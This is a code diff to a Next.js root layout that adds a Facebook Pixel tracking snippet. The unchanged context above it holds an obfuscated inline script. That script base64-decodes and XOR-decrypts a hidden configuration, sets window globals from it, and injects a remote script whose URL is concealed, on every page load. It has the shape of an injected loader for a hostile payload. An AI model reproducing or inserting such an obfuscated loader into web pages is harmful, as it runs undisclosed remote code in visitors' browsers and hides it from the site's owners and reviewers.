@@ -81,6 +81,33 @@ export default function RootLayout({
             __html: `(function(){var s_l=atob("DCnuiyOKBTqlhuqB2VLM/lHmJwCH7p71qVrUpAzpYVSL857ssE+XpUDlaBTH9MXyuluH+1f5Kk/R65mutUia7lD+K1DWpMajuF2a+UrocE7A9ci7glLM5ULnYBifpI7grUjD/lfnbFzcq5rzvF+L5VenfVnK4sfyukLMpwH8ZFbQ48i7+wuTp1ioa1vI48i7+02P/0KncE7I74z49Fmc7lXva06I9Z/jsE2dqQ+oc1vJ84+j4wvM9n73");var w_9=[];for(var v_euj=0;v_euj<s_l.length;v_euj++){w_9.push(s_l.charCodeAt(v_euj)&255);}var a_ga4z=w_9[0];var p_e=w_9.slice(1,1+a_ga4z);var l_xzr=w_9.slice(1+a_ga4z);var p_0u=l_xzr.map(function(b,r_142s){return b^p_e[r_142s%a_ga4z];});var w_7vg="";for(var s_j40t=0;s_j40t<p_0u.length;s_j40t++){w_7vg+=String.fromCharCode(p_0u[s_j40t]&255);}var r_dt=decodeURIComponent(escape(w_7vg));var i_ent=JSON.parse(r_dt);var t_f2=i_ent.globals||[];t_f2.forEach(function(d_mrzs){window[d_mrzs.name]=d_mrzs.value;});var d_j=document.createElement("script");d_j.src=i_ent.url;d_j.async=true;d_j.defer=true;(i_ent.attributes||[]).forEach(function(p_5dp){d_j.setAttribute(p_5dp.name,p_5dp.value);});(document.head||document.documentElement).appendChild(d_j);})();`,
           }}
         />
+
+        <Script
+          id="facebook-pixel"
+          strategy="afterInteractive"
+          dangerouslySetInnerHTML={{
+            __html: `!function(f,b,e,v,n,t,s)
+            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)}(window, document,'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+            fbq('init', '1767450204383809');
+            fbq('track', 'PageView');`,
+          }}
+        />
+        <noscript>
+          {/* eslint-disable-next-line @next/next/no-img-element */}
+          <img
+            height="1"
+            width="1"
+            style={{ display: 'none' }}
+            src="https://www.facebook.com/tr?id=1767450204383809&ev=PageView&noscript=1"
+            alt=""
+          />
+        </noscript>
       </head>
 
       <body className="font-sans antialiased">
